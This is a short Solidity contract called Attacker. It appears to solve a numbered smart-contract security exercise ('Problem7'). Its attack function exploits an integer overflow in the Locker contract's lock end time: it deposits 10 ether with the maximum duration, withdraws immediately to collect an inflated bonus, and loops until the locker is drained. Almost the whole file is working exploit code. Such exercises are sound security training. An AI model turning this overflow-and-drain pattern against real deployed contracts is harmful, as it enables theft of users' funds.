// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Locker} from "../src/Problem7.sol";

contract Attacker {

    // Deposit with the largest duration that can be
    // entered. The end time will overflow, allowing
    // for immediate withdrawal, and since the duration
    // is large, the bonus is maximized.
    //
    // Repeat until locker balance is drained.
    function attack(Locker locker) public {
        for (uint256 i = 1000; i > 0; i -= 10) {
            locker.deposit{value: 10 ether}(type(uint256).max);
            locker.withdraw();
        }
    }

    // A fallback function is required to receive the
    // winning funds.
    fallback() external payable {}
    
}